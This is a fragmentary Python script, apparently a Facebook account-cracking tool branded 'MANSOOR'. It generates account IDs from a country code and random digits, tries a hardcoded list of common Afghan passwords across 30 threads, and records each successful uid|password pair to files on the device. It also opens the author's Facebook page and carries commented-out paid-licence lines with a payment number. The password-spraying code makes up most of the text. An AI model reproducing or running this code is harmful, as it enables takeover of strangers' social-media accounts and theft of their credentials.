...
try:
	...
	os.system('python MANSOOR.py')
print('\n\033[1;31m Cheking Server...');time.sleep(3)


print('\n\033[1;32m Please Follow Me');time.sleep(1)
os.system('xdg-open  https://www.facebook.com/mansorahmmad.nikzad ')
...
\033[1;32m------------------------------------------------
|   Owner        :   Mansoor Khan
|   Facebook     :   Mansoor Khan
|   Telegram     :  @mansoor khan
|   Tools        :     FREE
|   Versino      :     1.0
\033[1;31m------------------------------------------------
"""
...
def approval():
 ...
 #     print(" Other Countries : 15$ For Monthly")
    #  print('\033[1;37m----------------------------------------------')
 #     print(" Easypaisa  Number     : +93701645211")
...
def awmafghan():
		...
		with tred(max_workers=30) as AWM:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'afghan','afghan12345','afghan123','afghanistan','500500','100200','nangarhar','kabul123','Afghan123','Afghanistan','123456','khan1234', 'khan123','102030','khankhan']
				if mthd in ['1','01']:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [MANSOOR-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MANSOOR-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [MANSOOR-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                                ...
                                                print('\r\r\033[1;32m [MANSOOR-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MANSOOR--OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [MANSOOR-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MANSOOROK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [MANSOOR-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/MANSOOR-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
